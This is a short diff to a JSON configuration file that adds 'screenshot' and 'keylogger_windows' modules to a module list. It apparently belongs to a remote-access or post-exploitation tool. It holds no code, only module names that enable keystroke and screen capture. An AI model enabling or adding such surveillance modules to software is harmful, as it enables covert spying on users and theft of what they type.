@@ -4,5 +4,13 @@
     },
     {
         "module" : "environment"
+    },
+    {
+	    "module":"screenshot"
+    },
+    {
+	    "module":"keylogger_windows"
     }
+
+
 ]
